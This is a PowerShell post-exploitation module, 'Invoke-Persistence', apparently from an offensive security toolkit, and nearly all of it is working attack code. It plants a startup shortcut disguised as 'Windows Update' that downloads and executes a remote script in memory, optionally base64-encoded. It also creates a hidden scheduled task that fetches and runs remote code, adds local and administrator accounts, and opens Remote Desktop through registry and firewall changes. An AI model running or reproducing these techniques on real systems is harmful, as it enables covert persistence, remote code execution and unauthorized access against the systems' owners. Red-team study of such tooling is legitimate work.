function Invoke-Persistence {
<# 

.SYNOPSIS
	Several methods that allow persisting on a target system. 

.PARAMETER Help
	Shows Detailed Help.

.PARAMETER List
	Shows Brief Command Help.

.PARAMETER StartupLnk
	Drops a .LNK file in the current user's startup directory named "Windows Update" that executes a remotely hosted PowerShell script in memory (Net.WebClient DownloadString).
	
	If the "-Encoded" parameter is appended to the command line, the downloadstring will be encoded and will use PowerShell's -EncodedCommand function to execute.

.PARAMETER AddUser
	Adds a local user. If the [-Admin] parameter is specified, adds an existing user to the local Administrators group. Use the [-Delete] param to delete a user. (Requires Elevation)

.PARAMETER EnableRdp
	Enables remote desktop on the target, and adds an existing user to the Remote Desktop users group. (Requires Elevation)

.PARAMETER PsTask
	Generates a scheduled task that utilizes Net.Webclient Downloadstring method to a remote PowerShell script.

.EXAMPLE 
	PS> Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
	
.EXAMPLE
	PS> Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1 -Encoded
	
.EXAMPLE
	PS> Invoke-Persistence -StartupLnk -Clean

.EXAMPLE 
	PS> Invoke-Persistence -AddUser -UserName user2 -password "p@a55wrd"
	
.EXAMPLE 
	Invoke-Persistence -EnableRdp -RdpUser tjones
	
.EXAMPLE 
	Invoke-Persistence -PsTask -PsUrl http://server/script.ps1 -TaskName "Test" -Time "00:01"

.EXAMPLE 
	Invoke-Persistence -PsTask -TaskName "Test" -Clean

.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$StartupLnk,
	[String]$PsUrl,
	[Switch]$Encoded,
	[Switch]$Clean,
	
	[Parameter(Mandatory = $False)]
	[Switch]$AddUser,
	[String]$UserName,
	[String]$Password,
	[Switch]$Admin,
	[Switch]$Delete,
	
	[Parameter(Mandatory = $False)]
	[Switch]$EnableRdp,
	[String]$RdpUser,

	[Parameter(Mandatory = $False)]
	[Switch]$PsTask,
	[String]$PsUrl2=[String]$PsUrl,
	[String]$TaskName,
	[String]$Time,
	[Switch]$Clean2=[Switch]$Clean
	
)

$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Persistence HELP ###
 -------------------------------
 Available Invoke-Persistence Commands:
 --------------------------------------
 |-----------------------------------------------------------------------------|
 | -StartupLnk [-Clean] [-PsUrl] File_url [-Encoded]                           |
 |-----------------------------------------------------------------------------|

   [*] Description: Drops a .LNK file in the current user's startup directory 
       named "Windows Update" that executes a remotely hosted PowerShell script 
       in memory (Net.WebClient DownloadString). If the "-Encoded" parameter is 
       appended to the command line, the downloadstring will be encoded and will 
       use PowerShell's -EncodedCommand function to execute.

   [*] Usage: Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
   [*] Usage: Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1 -Encoded 
   [*] Usage: Invoke-Persistence -StartupLnk -Clean (Removes startup lnk)

	   
   [*] Mitre ATT&CK Ref: T1060 (Registry Run Keys / Startup Folder)
	   
 |-----------------------------------------------------------------------------|
 | -Adduser [-Username] username [-Password] password [-Admin] [-Delete]       |
 |-----------------------------------------------------------------------------|

   [*] Description: Adds a local user. If the [-Admin] parameter is specified, 
       adds an existing user to the local Administrators group. Use the [-Delete] 
       param to delete a user. (Requires Elevation)

   [*] Usage: Invoke-Persistence -AddUser -UserName user2 -Password "p@a55wrd"
   [*] Usage: Invoke-Persistence -AddUser -UserName user2 -Admin
   [*] Usage: Invoke-Persistence -Adduser -Username user2 -Delete

 |-----------------------------------------------------------------------------|
 | -EnableRdp [-RdpUser] user                                                  |
 |-----------------------------------------------------------------------------|

   [*] Description: Enables remote desktop on the target, and adds an existing
       user to the Remote Desktop users group. (Requires Elevation)

   [*] Usage: Invoke-Persistence -EnableRdp -RdpUser tjones
   
 |-----------------------------------------------------------------------------|
 | -PsTask [-PsUrl] url [-TaskName] Task Name [-Time] "time"                   |
 |-----------------------------------------------------------------------------|

   [*] Description: Generates a scheduled task that utilizes Net.Webclient 
       Downloadstring method to a remote PowerShell script.

   [*] Usage: Invoke-Persistence -PsTask -PsUrl http://server/script.ps1 -TaskName "Test" -Time "00:01"
       Usage: Invoke-Persistence -PsTask -TaskName "Test" -Clean
   
 \-----------------------------------------------------------------------------/
 
"@
	}
	elseif ($List -eq $True) {
		Write @"
 
 Invoke-Persistence Brief Command Usage:
 ---------------------------------------
 Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
 Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1 -Encoded
 Invoke-Persistence -AddUser -UserName user2 -Password "p@a55wrd"
 Invoke-Persistence -EnableRdp -RdpUser tjones
 Invoke-Persistence -PsTask -PsUrl http://server/script.ps1 -TaskName "Test" -Time "00:01"
 Invoke-Persistence -PsTask -TaskName "Test" -Clean
 
"@
	}
	
	if ($StartupLnk -and $PsUrl -and $Encoded) {
		
		$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
		
		$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.Webclient).downloadstring('$PsUrl')"))

		$PSExe = "$pshome\powershell.exe"
		$Wss = New-Object -ComObject WScript.Shell
		$LnkCr = $Wss.CreateShortcut("$StartUp\Windows Update.lnk")
		$LnkCr.TargetPath = $PSExe
		$LnkCr.Arguments =@"
-ep bypass -nop -EncodedCommand "$EncodedCommand"
"@
		$LnkCr.Description ="Windows Update"
		$LnkCr.IconLocation = "shell32.dll,14"
		$LnkCr.WorkingDirectory ="C:\Windows\System32"
		$LnkCr.Save()
	
		while ($(Test-Path "$StartUp\Windows Update.lnk")) {
			
			$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
			$Success = @"

 [+] Success! "Windows Update.lnk" Installed:
	$Startup\Windows Update.lnk file.

 [+] LNK Target:
	$pshome\powershell.exe -ep bypass -nop -EncodedCommand "$EncodedCommand"

"@
			$h
			$Success
			$h
			return
		}
	}
	$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
	if ($StartupLnk -and $Clean -and $(Test-Path "$StartUp\Windows Update.lnk")) {
		$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
		Remove-Item "$Startup\Windows Update.lnk"
		$h
		Write "`n [+] Successfully removed $StartUp\Windows Update.lnk`n"
		$h
		return
	}
	elseif ($StartupLnk -and $Clean -and !$(Test-Path "$StartUp\Windows Update.lnk")) {
		$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
		$h
		Write "`n [-] $StartUp\Windows_Update.lnk doesn't exist!`n"
		$h
		return
	}
	elseif ($StartupLnk -and $PsUrl) {
		$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"

		$PSExe = "$pshome\powershell.exe"
		$Wss = New-Object -ComObject WScript.Shell
		$LnkCr = $Wss.CreateShortcut("$StartUp\Windows Update.lnk")
		$LnkCr.TargetPath = $PSExe
		$LnkCr.Arguments =@"
-ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsUrl')"
"@
		$LnkCr.Description ="Windows Update"
		$LnkCr.IconLocation = "shell32.dll,14"
		$LnkCr.WorkingDirectory ="C:\Windows\System32"
		$LnkCr.Save()
	
		while ($(Test-Path "$StartUp\Windows Update.lnk")) {
			
			$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
			$Success = @"

 [+] Success! "Windows Update.lnk" Installed:
	$Startup\Windows Update.lnk file.

 [+] LNK Target:
	$pshome\powershell.exe -ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsUrl')"

"@
			$h
			$Success
			$h
			return
		}
	}
	$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
	if ($StartupLnk -and $Clean -and $(Test-Path "$StartUp\Windows Update.lnk")) {
		$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
		Remove-Item "$Startup\Windows Update.lnk"
		$h
		Write "`n [+] Successfully removed $StartUp\Windows Update.lnk`n"
		$h
		return
	}
	
	elseif ($AddUser -and $Username -and $Password) {

		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h
			(net user $Username $Password /add /y)
			Write " [+] User `"$username`" added."
			$h
		}
		if (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to add user `"$Username`"."
			$h 
			return
		}
	}
	elseif ($Adduser -and $Username -and $Admin) {
	
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
		
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			(net localgroup `"Administrators`" $UserName /add)
			Write " [+] User `"$Username`" added to the local Administrators group."
			$h
		}
		if (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to add `"$username`" to admins group."
			$h 
			return
		}
	}
	elseif ($Adduser -and $Username -and $Delete) {

		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			(net user $username /delete)
			Write " [+] User `"$username`" deleted."
			$h
		}
		if (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to delete `"$Username`"."
			$h 
			return
		}
	}
	elseif ($EnableRdp -and $RdpUser) {
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			Try {
				$h = "`n### Invoke-Persistence(EnableRdp) ###`n"
				$h
				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f)
				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f)
				(netsh advfirewall firewall set rule group="remote desktop" new enable=yes)
				(net localgroup "Remote Desktop Users" $RdpUser /add)
				Write " [+] Successfully enabled Remote Desktop and added $RdpUser to the Remote Desktop users group."
				$h
			}
			Catch {
				Write " [!] Unknown Error."
			}
		}
		if (!$([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups `
			-match "S-1-5-32-544"))) {
			$h = "`n### Invoke-Persistence(EnableRdp) ###`n"
			$h
			Write " [-] This function requires elevation. Unable to enable Remote Desktop."
			$h
		}
	}
	if ($PsTask -and $PsUrl -and $TaskName -and $Time) {
		Try {
			$Wss = New-Object -ComObject WScript.Shell
			$LnkCr = $Wss.CreateShortcut("$env:appdata\$Rs1.lnk")
			$LnkCr.TargetPath = "C:\Windows\System32\schtasks.exe"
			$LnkCr.Arguments = "/Create /F /TN `"$TaskName`" /SC DAILY /ST $Time /TR ""powershell -ep Bypass -nop -w 1 \""iex ((New-Object Net.WebClient).DownloadString(\\\""'$PSUrl\\\""))\"""
			$LnkCr.Save()
			Start-Process -Wi Hidden -Fi "$env:appdata\$Rs1.lnk"
			Remove-Item "$env:appdata\$Rs1.lnk"
			Write " [+] Success."
		}
		Catch {
			Write " [!] Unknown Error."
		}
	}
	elseif ($PsTask -and $TaskName -and $Clean) {
		(C:\w?*n???s\s*3?\s?ht?s?s.?x? /Delete /TN $TaskName /f)
	}
		
}

